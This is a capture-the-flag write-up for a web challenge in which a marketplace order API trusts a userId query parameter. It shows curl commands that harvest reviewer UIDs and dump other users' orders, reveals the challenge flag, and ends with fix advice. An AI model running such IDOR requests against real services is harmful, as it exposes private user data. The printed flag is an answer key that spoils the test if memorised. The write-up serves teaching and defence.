---
title: "Marketplace — Order History IDOR via Review UIDs"
ctf: "riffhack"
date: 2026-06-19
category: web
difficulty: easy
points: ?
flag_format: "bitflag{...}"
author: "CL4Y"
---

# Marketplace — Order History IDOR via Review UIDs

> "Order history should be private, but the marketplace leaves a few loose threads. Can you follow one to something that is not yours? Find user IDs in reviews, then manipulate HTTP requests to access their orders."
> Target: `http://159.89.237.133/`

## Summary

`GET /api/orders` reads its scope from a `userId` query parameter and uses it verbatim instead of the caller's JWT `id`. Listing pages render seeded operator reviews along with each reviewer's `UID:` value, so user IDs are publicly readable. Plugging one of those UIDs into the query parameter dumps that user's order history. Phantom_Hacker (`k7m3n`) has an `order-admin-001` row whose `notes` column is the flag.

## Solution

### Step 1: Harvest user IDs from review cards

Every listing page (e.g. `/listing/rat-builder`) renders the canned operator reviews and shows the reviewer's "UID:" in the byline:

```
Shadow_Op       Verified  UID: abc12
Phantom_Hacker  Verified  UID: k7m3n
CyberGhost      Verified  UID: xyz78
```

### Step 2: Register a throwaway account to satisfy the auth gate

```bash
TOKEN=$(curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"email":"a@b.c","password":"x"}' \
  http://159.89.237.133/api/auth/register | jq -r .token)
```

### Step 3: Use `?userId=` to scope `/api/orders` to someone else

```bash
for uid in abc12 k7m3n xyz78; do
  echo "=== $uid ==="
  curl -s -b "auth-token=$TOKEN" \
    "http://159.89.237.133/api/orders?userId=$uid" | jq
done
```

Output:

```json
=== abc12 ===
{"orders":[{"id":"order-user-001","userId":"abc12","listingId":"rat-builder",...,"notes":null,...}],"userId":"abc12"}

=== k7m3n ===
{"orders":[{"id":"order-admin-001","userId":"k7m3n","listingId":"macro-builder",
  "listingName":"Macro Builder","price":199.99,"status":"completed",
  "notes":"bitflag{1d0r_1s_4_d4ng3r0us_g4m3}",
  "createdAt":"2026-06-17T21:45:59.682Z"}],"userId":"k7m3n"}

=== xyz78 ===
{"orders":[{"id":"order-user-002","userId":"xyz78",...,"notes":"Great tool, highly recommend!",...}],"userId":"xyz78"}
```

One-liner:

```bash
curl -s -b "auth-token=$TOKEN" \
  'http://159.89.237.133/api/orders?userId=k7m3n' \
  | jq -r '.orders[].notes'
# bitflag{1d0r_1s_4_d4ng3r0us_g4m3}
```

## Why it works

- **Public reviewer UIDs.** Operator review cards on every listing display the reviewer's raw user id. The challenge intentionally treats UIDs as non-sensitive even though the orders table is keyed on them.
- **Trusted query-parameter scope.** `/api/orders` accepts a `userId` query string and uses it directly as the scope for the DB lookup, instead of pulling the id from the validated JWT (`req.user.id`). The endpoint even echoes back `"userId": "<requested>"` in the response, confirming the override worked.
- **Planted flag.** The author seeded an `order-admin-001` row owned by Phantom_Hacker (`k7m3n`) with the flag in the `notes` column.

## Fix

- Derive the scope id strictly from the verified session/JWT — never from a user-controllable query string or body field.
- If a `userId` parameter is genuinely needed (e.g. an admin tool), gate it with an explicit role check and reject any request whose JWT-id ≠ requested-id for non-admins.
- Treat operator UIDs as sensitive (or mint a separate public handle) so user enumeration via review cards isn't trivial.

## Flag

```
bitflag{1d0r_1s_4_d4ng3r0us_g4m3}
```
